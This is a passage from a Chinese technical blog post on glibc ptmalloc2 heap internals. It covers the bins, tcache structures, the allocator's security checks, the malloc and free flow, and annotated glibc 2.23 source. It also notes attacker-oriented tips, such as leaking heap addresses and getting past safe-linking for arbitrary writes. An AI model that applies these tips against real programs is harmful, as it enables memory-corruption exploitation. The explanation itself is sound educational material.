fast bin 有如下性质：</p>
<ul>
<li>由于采用单链表结构，fast bin 采取 LIFO 策略。</li>
<li>每个 fast bin 中维护的 chunk 大小确定，并且 fast bin 维护的最大的
<code>chunk</code> 为 128 字节（64位），因此不超过
0x80（<code>chunk</code> 大小）的内存释放会进入 fast bin 。</li>
<li>fast bin 范围的 <code>chunk</code> <strong>下一个相邻
<code>chunk</code></strong> 的 <code>PREV_INUSE</code> 始终被置为
1。因此它们不会和其它被释放的 <code>chunk</code> 合并。除非调用
<code>malloc_consolidate</code> 函数。</li>
</ul>
<p>安全检查：</p>
<ul>
<li><p><code>size</code>：在 <code>malloc()</code> 函数分配 fastbin size
范围的 <code>chunk</code> 时，若是对应的 <code>fastbin</code> 中有空闲
<code>chunk</code>，在取出前会检查其 <code>size</code>
域与对应下标是否一致，不会检查标志位，若否便会触发<code>abort</code>
。</p></li>
<li><p>double free：在 <code>free()</code> 函数中会对 fast bin
链表的头结点进行检查，若将要被放入 fast bin 中的 <code>chunk</code>
与对应下标的链表的头结点为同一 <code>chunk</code>，则会触发
<code>abort</code> 。</p></li>
<li><p>Safe linking 机制（only glibc2.32 and up）：自 glibc 2.32
起引入了 safe-linking 机制，其核心思想是在链表上的 <code>chunk</code>
中并不直接存放其所连接的下一个 <code>chunk</code> 的地址，而是存放下一个
<code>chunk</code> 的地址与【 <code>fd</code> 指针自身地址右移
12位】所异或得的值，使得攻击者在得知该 <code>chunk</code>
的地址之前无法直接利用其构造任意地址写。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure></div>
<p>需要注意的是 fast bin 的入口节点存放的仍是未经异或的
<code>chunk</code> 地址。 另外第一个加入 fast bin 的 <code>chunk</code>
的 <code>fd</code> 字段可以泄露堆地址（右移 12 位）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">	fb = &amp;fastbin (av, idx);</span><br><span class="line">	mchunkptr old = *fb, old2;</span><br><span class="line">	...</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="small-bin">Small Bin</h3>
<p>small bin 采用双向链表，结构如下图所示。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/86163676dc9adde0954c070bc0eeef6a.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
small bin 有如下性质：</p>
<ul>
<li>small bins 中每个 <code>bin</code> 对应的链表采用 FIFO 的规则。</li>
<li>每个 small bin 维护的 <code>chunk</code> 大小确定，并且 small bin
维护的最大的 <code>chunk</code> 为 1008 字节（64位），即 0x3f0 的
<code>chunk</code> 大小。 ### Large Bin large bins 中一共包括 63 个
<code>bin</code>，每个 <code>bin</code> 中的 <code>chunk</code>
的大小不一致，而是处于一定区间范围内。large bin 的结构如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f3b03f72266a82c4dfe82b7dda5bcfed.png"
                     
alt="在这里插入图片描述" 
                > 关于 <code>fd_nextsize</code> 和
<code>bk_nextsize</code> 的机制，这里以 <code>fd_nextsize</code>
为例：</li>
<li><code>fd_nextsize</code> 和 <code>bk_nextsize</code> 与
<code>bins</code> 数组没有连接关系（这就解释了为什么 <code>bins</code>
上 没有体现 <code>fd_nextsize</code> 和 <code>bk_nextsize</code>
结构）。</li>
<li>large bin 里的 <code>chunk</code> 在 <code>fd</code>
指针指向的方向上按照 <code>chunk</code> 大小降序排序。</li>
<li>当 large bin 里有一个 <code>chunk</code> 时，
<code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指向自己（如上面
large bin 的结构图所示）。</li>
<li>当 large bin 里同一大小的 <code>chunk</code> 有多个时，只有相同大小
<code>chunk</code> 中的第一个的 <code>fd_nextsize</code> 和
<code>bk_nextsize</code> 指针有效，其余的 <code>chunk</code> 的
<code>fd_nextsize</code> 和 <code>bk_nextsize</code> 设为 NULL 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8e05f44b0395a5b18b622a0707184874.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>large bin 中有多个不同大小的 <code>chunk</code> 时
<code>fd_nextsize</code> 连接比它小的第一个 <code>chunk</code>
，<code>bk_nextsize</code> 就是把 <code>fd_nextsize</code>
反过来连到对应结构上。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/64b10a726bbcc36d3ec99900a9e8237e.png"
                     
alt="在这里插入图片描述" 
                ></li>
<li>large bin 最小的一组 <code>chunk</code> 中的第一个
<code>chunk</code> 的 <code>fd_nextsize</code> 连接的是最大的
<code>chunk</code>，最大的 <code>chunk</code> 的
<code>bk_nextsize</code> 相反。<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0d80fe66f57e24c95ac69650b80f81c7.png"
                     
alt="在这里插入图片描述" 
                > ### Unsorted Bin unsorted bin 可以视为空闲
<code>chunk</code> 回归其所属 <code>bin</code> 之前的缓冲区。像 small
bin 一样采用双向链表维护。<code>chunk</code> 大小乱序。 ## Top Chunk
程序第一次进行 <code>malloc</code> 的时候，<code>heap</code>
会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top
chunk 就是处于当前堆的物理地址最高的 <code>chunk</code> 。这个
<code>chunk</code> 不属于任何一个 <code>bin</code>
，它的作用在于当所有的 <code>bin</code>
都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的
top chunk。否则，就对 <code>heap</code> 进行扩展后再进行分配。在
<code>main_arena</code> 中通过 <code>sbrk</code> 扩展
<code>heap</code>，而在 <code>thread arena</code> 中通过
<code>mmap</code> 分配新的 <code>heap</code>。 需要注意的是，top chunk
的 <code>prev_inuse</code> 比特位始终为 1，否则其前面的
<code>chunk</code> 就会被合并到 top chunk 中。 ## last remainder
在用户使用 <code>malloc</code> 请求分配内存时，ptmalloc2 找到的
<code>chunk</code>
可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last
remainder chunk ，unsort bin 也会存这一块。top chunk
分割剩下的部分不会作为 <code>last_remainder</code> 。</li>
</ul>
<h2 id="tcache">tcache</h2>
<p><code>tcache</code> 是 glibc 2.26 (ubuntu 17.10)
之后引入的一种技术，目的是提升堆管理的性能，与 fast bin
类似。<code>tcache</code>
引入了两个新的结构体，<code>tcache_entry</code> 和
<code>tcache_perthread_struct</code> 。</p>
<p><code>tcache_entry</code> 定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></div>
<p><code>tcache_entry</code> 用于链接空闲的 <code>chunk</code>
结构体，其中的 <code>next</code> 指针指向下一个大小相同的
chunk。需要注意的是这里的 <code>next</code> 指向 <code>chunk</code> 的
user data，而 fast bin 的 <code>fd</code> 指向 <code>chunk</code>
开头的地址。而且，<code>tcache_entry</code> 会复用空闲
<code>chunk</code> 的 user data 部分。</p>
<p><code>tcache_perthread_struct</code> 定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></div>
<p>对应结构如下： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b095b05bdaa8e1675787b765e1f4b332.png"
                     
alt="在这里插入图片描述" 
                > 每个 thread 都会维护一个
<code>tcache_perthread_struct</code> ，它是整个 <code>tcache</code>
的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和
<code>TCACHE_MAX_BINS</code> 项 <code>tcache_entry</code>。这个结构在
<code>tcache_init</code> 函数中被初始化在堆上，大小为 0x250（高版本为
0x290）。其中数据部分前 0x40 为 <code>counts</code> ，剩下的为
<code>entries</code> 结构。如果能控制这个堆块就可以控制整个
<code>tcache</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><code>tcache_perthread_struct</code> 中的 <code>tcache_entry</code>
用单向链表的方式链接了相同大小的处于空闲状态（<code>free</code> 后）的
<code>chunk</code>，这一点上和 fast bin 很像。</p>
<p>另外与 fast bin 相同的是释放进入 <code>tcache</code> 的
<code>chunk</code> 的下一个相邻 <code>chunk</code> 的
<code>PREV_INUSE</code> 位不清零。</p>
<p><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲
<code>chunk</code> 的数目，每条链上最多可以有 7 个 <code>chunk</code>
。注意指针指向的位置是 <code>fd</code> 指针，这一点与 fast bin
不同。</p>
<p>结构如下： <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/06577694365bfca457c02a0664f6d368.png"
                     
alt="在这里插入图片描述" 
                > stash 机制： 当申请的大小在
<code>tcache</code> 范围的 <code>chunk</code> 在 <code>tcache</code>
中没有，此时 ptmalloc 会在其他 <code>bin</code> 里面找，如果找到了会将该
<code>chunk</code> 放到 <code>tcache</code> 中，直到 <code>tcache</code>
填满，最后直接返回找到的 <code>chunk</code> 或是从 <code>tcache</code>
中取出并返回。</p>
<p>安全检查：</p>
<ul>
<li>tcache key（only libc2.29 and up）：自 glibc2.29 版本起
<code>tcache</code> 新增了一个 key 字段，该字段位于 <code>chunk</code>
的 bk 字段，值为 <code>tcache</code> 结构体的地址，若
<code>free()</code> 检测到 <code>chunk-&gt;bk == tcache</code> 则会遍历
<code>tcache</code> 查找对应链表中是否有该 <code>chunk</code>
最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制</li>
<li>Safe linking 机制（only glibc2.32 and up）：与 fast bin 类似。
绕过方法：
<ul>
<li>在 <code>tcache</code> 的一个 <code>entry</code> 中放入第一个
<code>chunk</code> 时，其同样会对该 <code>entry</code> 中的
“<code>chunk</code>” （NULL）进行异或运算后写入到将放入
<code>tcache</code> 中的 <code>chunk</code> 的 <code>fd</code>
字段，若是我们能够打印该 free chunk 的 <code>fd</code>
字段，便能够直接获得未经异或运算的堆上相关地址（右移 12 位）</li>
<li>在 <code>tcache-&gt;entry</code>
中存放的仍是未经加密过的地址，若是我们能够控制 <code>tcache</code>
管理器则仍可以在不知道堆相关地址时进行任意地址写。 # 关键过程
仅简要介绍大致过程，具体细节最好还是查看 libc 源码。 ## malloc</li>
</ul></li>
<li>首先在 _libc_malloc 函数中先判断 __malloc_hook
函数指针是否为空，如果不为空则调用 __malloc_hook 函数。</li>
<li>如果存在 tcache 且有相应大小的 chunk 则将其从 tcache
中取出并返回结果。</li>
<li>调用 _int_malloc 函数。
<ul>
<li>首先把申请的内存的字节数转化为 chunk 的大小。</li>
<li>如果 arena 未初始化 ，则调用 sysmalloc 向系统申请内存，然后将获取的
chunk 返回。</li>
<li>如果申请的 chunk 大小不超过 fast bin 的最大值，则尝试从对应的 fast
bin 的头部获取 chunk 。在获取到 chunk 后，如果对应的 fast bin 还有 chunk
并且大小在 tcache 范围就将它们依次从头结点取出放到 tcache 中，直到把
tcache 放满。最后将申请到的 chunk 返回。</li>
<li>如果申请的 chunk 在 small bin 大小范围则进行与 fast bin
一样的操作，只不过这次取 chunk 是依次从链表尾部取。</li>
<li>如果申请的 chunk 在 large bin 大小范围则调用 malloc_consolidate
函数将 fast bin 中的 chunk 合并后放入 unsorted bin 。</li>
<li>循环进行如下操作：
<ul>
<li>循环取 unsorted bin 最后一个 chunk 。
<ul>
<li>如果用户的请求为 small bin chunk，那么我们首先考虑 last
remainder，如果当前 chunk 是 last remainder ，且 last remainder 是
unsorted bin 中的唯一一个 chunk ， 并且 last remainder
的大小分割后还可以作为一个 chunk，则从 last reminder
中切下一块内存返回。</li>
<li>如果 chunk 的大小恰好等于申请的 chunk 大小，则如果该内存大小在
tcache 范围且 tcache 没有满，则先将其放入 tcache，之后会考虑从 tcache
中找 chunk 。否则直接将找到的 chunk 返回。</li>
<li>根据 chunk 的大小将其放入 small bin 或 large bin 中。对于 small bin
直接从链表头部加入；对于 large
bin，首先特判加入链表尾部的情况，如果不在链表尾部则从头部遍历找位置，如果
large bin 中有与加入的 chunk 大小相同的 chunk ，则加到第一个相等 chunk
后面，否则加到合适位置后还需要更新 nextsize 指针。</li>
<li>尝试从 tcache 找 chunk 。</li>
<li>如果循环超过 10000 次则跳出循环。</li>
</ul></li>
<li>尝试从 tcache 找 chunk 。</li>
<li>如果申请 chunk 大小不在 small bin 范围，则从后往前遍历对应 large bin
，找到第一个不小于申请 chunk 大小的 chunk 。为了 unlink 时避免修改
nextsize 的操作，如果存在多个合适的 chunk 则选择第二个 chunk
。如果选取的 chunk 比申请的 chunk 大不少于 MINSIZE
，则需要将多出来的部分切出来作为 remainder ，并将其加入 unsorted bin
头部。然后将获取的 chunk 返回。</li>
<li>找一个 chunk 范围比申请 chunk 大的非空 bin 里面找最后一个 chunk
，这个过程用 binmap 优化，同时也可以更新 binmap 的状态。这个 chunk
上切下所需的 chunk ，剩余部分放入 unsorted bin 头部。然后将获取的 chunk
返回。</li>
<li>如果 top chunk 切下所需 chunk 后剩余部分还是不小于 MINSIZE 则从top
chunk 上切下所需 chunk 返回。</li>
<li>如果 fast bins 还有 chunk 则调用 malloc_consolidate 合并 fast bin
中的 chunk 并放入 unsorted bin 中，然后继续循环。</li>
<li>最后 sysmalloc 系统调用向操作系统申请内存分配 chunk 。
<ul>
<li>如果 arena 没有初始化或者申请的内存大于 mp_.mmap_threshold，并且
mmap 的次数小于最大值，则使用 mmap 申请内存。然后检查一下是否 16
字节对齐然后更新 mmap 次数和 mmap 申请过的最大内存大小后就将 chunk
返回。</li>
<li>如果 arena 没有初始化就返回 0</li>
<li>对之前的 top chunk 进行检查，如果是 dummy top 的话，因为是用
unsorted bin 表示的，因此 top chunk 的大小需要是 0
。否则堆的大小应该不小于
MINSIZE，并且前一个堆块应该处于使用中，并且堆的结束地址应该是页对齐的，由于页对齐的大小默认是
0x1000，所以低 12 个比特需要为 0。除此之外，top chunk 大小必须比申请
chunk 大小加上 MINSIZE 要小。</li>
<li>如果 arena 不是 main arena
<ul>
<li>尝试将 top chunk 所在的 heap 扩展大小，如果成功则更新 arena
记录的内存总大小 system_mem 和 top chunk 大小。</li>
<li>尝试申请一个新的 heap 。设置新的 heap 以及 arena 的参数并且将原来的
top chunk 先从尾部切下 2 个 0x10 大小的 chunk ，剩余部分如果不小于
MINSIZE 则将其释放掉。</li>
<li>否则，如果前面没有执行到 mmap 申请 chunk 的分支就尝试执行。</li>
</ul></li>
<li>如果 arena 是 main arena
<ul>
<li>计算需要获取的内存大小。需要获取的内存大小等于申请的 chunk 大小加上
0x20000 和 MINSIZE
。如果堆空间连续，则可以再减去原来内存的大小。然后将需要获取的内存大小与页大小对齐。</li>
<li>sbrk 扩展内存如果成功则会尝试调用一个 hook 函数，否则 mmap
申请内存，然后 brk 移到申请的内存处并设置堆不连续参数。</li>
<li>如果成功获取到内存，则更新 arena 记录的内存总大小 system_mem 和
sbrk_base。之后对一系列的情况进行处理，在这期间，之前的 top chunk
会被从尾部切下两个 0x10 大小的chunk，剩余部分如果不小于 MINSIZE
则将其释放掉。</li>
</ul></li>
<li>最后从新获取的 top chunk 上切下所需的 chunk 并返回。 ## free</li>
</ul></li>
</ul></li>
</ul></li>
<li>首先在 __libc_free 函数中先判断 __free_hook
函数指针是否为空，如果不为空则调用 __free_hook 函数。</li>
<li>如果 chunk 是 mmap 申请的，则调用 munmap_chunk 释放。</li>
<li>调用 _int_free 函数
<ul>
<li>如果释放的 chunk 大小在 tcache 范围且对应的 tcache
没有满，则直接放到 tcache 中然后返回。</li>
<li>如果在 fast bin 范围则加入到 fast bin 头部并返回。</li>
<li>如果不是 mmap 申请的内存
<ul>
<li>如果与释放 chunk 相邻的前一个 chunk 是空闲的，则将前一个 chunk 从
bin 中取出和释放 chunk 合并。</li>
<li>如果与释放 chunk 相邻的后一个 chunk 不是 top chunk
<ul>
<li>如果与释放 chunk 相邻的后一个 chunk 是空闲的，则将其从 bin
中取出和释放 chunk 合并，否则将其 PREV_INUSE 位置 0</li>
<li>将释放的 chunk 加入到 unsorted bin 头部。</li>
</ul></li>
<li>否则将其合并到 top chunk</li>
<li>如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD
就向系统返还内存</li>
</ul></li>
<li>否则调用 munmap_chunk 释放 chunk</li>
</ul></li>
</ul>
<h1 id="源码注释glibc-2.23">源码注释（glibc-2.23）</h1>
<h2 id="libc_malloc">__libc_malloc</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="comment">//用于保存指向分配区的指针</span></span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">  <span class="comment">//用于保存获得的mem指针:chunk_addr + 0x10</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取 __malloc_hook</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="comment">// 如果 __malloc_hook 不为 NULL 则调用 __malloc_hook ，参数为申请的内存大小。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">  <span class="comment">// 获取本线程对应的 thread_arena ，即 malloc_state 结构体。</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">// 调用 _int_malloc 申请内存</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="comment">// 如果 ar_ptr 不为 NULL 且内存没有申请成功则重新申请一次内存</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      <span class="comment">//获取下一个分配区</span></span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      <span class="comment">//再次调用_int_malloc</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//如果此时分配区指针不为空,释放分配区,这里分配已经结束了</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">// 确保只有 3 种情况，即要么没有申请成功，要么是通过 mmap 获取的内存，要么内存是从当前线程对应的 thread_arena 管理的内存中获取的。</span></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="comment">// 返回申请到的内存。</span></span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="libc_calloc">__libc_calloc</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_calloc (<span class="type">size_t</span> n, <span class="type">size_t</span> elem_size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av;</span><br><span class="line">  mchunkptr oldtop, p;</span><br><span class="line">  INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;</span><br><span class="line">  <span class="type">void</span> *mem;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> clearsize;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> nclears;</span><br><span class="line">  INTERNAL_SIZE_T *d;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* size_t is unsigned so the behavior on overflow is defined.  */</span></span><br><span class="line">  <span class="comment">// 将需要申请的内存大小转换为以字节为单位</span></span><br><span class="line">  bytes = n * elem_size;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_INTERNAL_SIZE_T \</span></span><br><span class="line"><span class="meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span></span><br><span class="line">  /</span><br><span class="line">  <span class="comment">// 如果 n 和 elem_size 中的任何一个不小于 HALF_INTERNAL_SIZE_T</span></span><br><span class="line">  <span class="comment">// 以 64 位为例，HALF_INTERNAL_SIZE_T = 2^32</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 判断 bytes 是否溢出</span></span><br><span class="line">      <span class="keyword">if</span> (elem_size != <span class="number">0</span> &amp;&amp; bytes / elem_size != n)</span><br><span class="line">        &#123;</span><br><span class="line">          __set_errno (ENOMEM);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 获取 __malloc_hook</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="comment">// 如果 __malloc_hook 不为 NULL 则调用 __malloc_hook，参数为申请内存的大小。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      sz = bytes;</span><br><span class="line">      mem = (*hook)(sz, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  sz = bytes;</span><br><span class="line"></span><br><span class="line">  arena_get (av, sz);</span><br><span class="line">  <span class="keyword">if</span> (av)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check if we hand out the top chunk, in which case there may be no</span></span><br><span class="line"><span class="comment">	 need to clear. */</span></span><br><span class="line">   <span class="comment">// 获取 top chunk 和 top chunk 的大小，这里的 top chunk 的大小是指 top chunk 头之后可以“控制”的的内存大小，具体看后面的解释。</span></span><br><span class="line">   <span class="comment">// 获取这些的原因是无论是 main_arena 控制的 heap 区域通过 sbrk 扩展还是非 main_arena 区域通过对 heap_info 向后扩展受保护的内存区域，</span></span><br><span class="line">   <span class="comment">// 新扩展的内存初始值为 0，即这些内存不需要清空，因此后面会将需要清零的内存大小减去和这部分内存重合的区域，提升程序效率。</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">      oldtop = top (av);</span><br><span class="line">      oldtopsize = chunksize (top (av));</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> MORECORE_CLEARS &lt; 2</span></span><br><span class="line">      <span class="comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena &amp;&amp;</span><br><span class="line">	  oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop)</span><br><span class="line">  <span class="comment">// 对于 main_arena 管理的内存，top chunk 后需要清空的内存大小为 top chunk 到原先 heap 区域末尾位置</span></span><br><span class="line">	oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	&#123;</span><br><span class="line">    <span class="comment">// 对于非 main_arena 管理的内存，top chunk 后需要清空的内存大小为 top chunk 到原先 heap_info 受保护区域末尾位置</span></span><br><span class="line">	  heap_info *heap = heap_for_ptr (oldtop);</span><br><span class="line">	  <span class="keyword">if</span> (oldtopsize &lt; (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop)</span><br><span class="line">	    oldtopsize = (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No usable arenas.  */</span></span><br><span class="line">      <span class="comment">// av 为 NULL ，那么之后 _int_malloc 会直接 mmap 获取内存，而 mmap 获取的内存初始值为 0，因此不需要清零。</span></span><br><span class="line">      oldtop = <span class="number">0</span>;</span><br><span class="line">      oldtopsize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用 _int_malloc 获取内存</span></span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 同 __libc_malloc 的 3 种情况</span></span><br><span class="line">  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">          av == arena_for_chunk (mem2chunk (mem)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span> &amp;&amp; av != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_calloc_retry, <span class="number">1</span>, sz);</span><br><span class="line">      av = arena_get_retry (av, sz);</span><br><span class="line">      mem = _int_malloc (av, sz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocation failed even after a retry.  */</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk 